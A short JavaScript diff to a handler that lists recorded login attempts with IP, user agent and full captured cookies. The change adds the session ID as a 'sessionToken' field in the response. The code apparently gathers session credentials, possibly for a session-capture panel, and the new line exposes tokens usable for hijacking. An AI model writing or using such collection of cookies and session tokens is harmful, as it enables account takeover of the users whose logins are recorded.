@@ -920,6 +920,7 @@ const getLoginAttempts = async (req, res) => {
         url: attempt.url,
         ipAddress: attempt.ip_address,
         userAgent: attempt.user_agent,
+        sessionToken: attempt.session_id, // Add session token for real-time updates matching
         hasCookies: attempt.has_cookies === 1,
         cookiesCount: cookies.length,
         cookies: cookies,
